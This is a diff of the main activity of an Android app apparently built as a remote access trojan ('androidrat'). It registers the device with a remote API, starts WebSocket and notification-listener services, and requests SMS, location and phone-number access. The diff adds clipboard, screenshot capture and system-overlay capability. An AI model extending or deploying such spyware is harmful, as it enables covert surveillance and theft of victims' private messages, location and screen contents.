@@ -1,19 +1,31 @@
 package com.nqmgaming.androidrat
 
 import android.Manifest
+import android.app.Activity
+import android.content.BroadcastReceiver
+import android.content.ClipboardManager
+import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.content.ServiceConnection
 import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
+import android.os.IBinder
 import android.provider.Settings
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.nqmgaming.androidrat.command.DeviceInfo
+import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder
 import com.nqmgaming.androidrat.data.ApiService
 import com.nqmgaming.androidrat.data.dto.DeviceDto
 import com.nqmgaming.androidrat.service.NotificationListener
+import com.nqmgaming.androidrat.service.ScreenshotService
 import com.nqmgaming.androidrat.service.WebSocketService
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
@@ -39,7 +51,6 @@ class MainActivity : AppCompatActivity() {
         sendRegistrationRequest()
         startService(Intent(this, WebSocketService::class.java))
         startService(Intent(this, NotificationListener::class.java))
-
     }
 
     // Request to send registration request
@@ -93,10 +104,13 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
             Manifest.permission.READ_SMS,
-            Manifest.permission.READ_PHONE_NUMBERS
+            Manifest.permission.READ_PHONE_NUMBERS,
+            Manifest.permission.FOREGROUND_SERVICE,
+            Manifest.permission.SYSTEM_ALERT_WINDOW,
+            Manifest.permission.ACCESS_WIFI_STATE
+
         )
     }
-
 }
 
 
